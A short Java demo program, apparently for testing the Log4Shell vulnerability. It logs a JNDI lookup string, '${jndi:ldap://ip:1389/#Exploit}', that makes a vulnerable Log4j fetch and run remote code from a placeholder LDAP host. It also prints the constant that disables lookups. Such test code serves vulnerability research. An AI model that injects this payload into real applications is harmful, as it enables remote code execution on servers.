package com.wang.demo;
import org.apache.logging.log4j.core.util.Constants;


import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Main {
	
	 private static final Logger logger = LogManager.getLogger();
	
	public static void main(String[] args) {
		
		 logger.error("${jndi:ldap://ip:1389/#Exploit}");
		 logger.info(Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS);
		 
		
	}

}
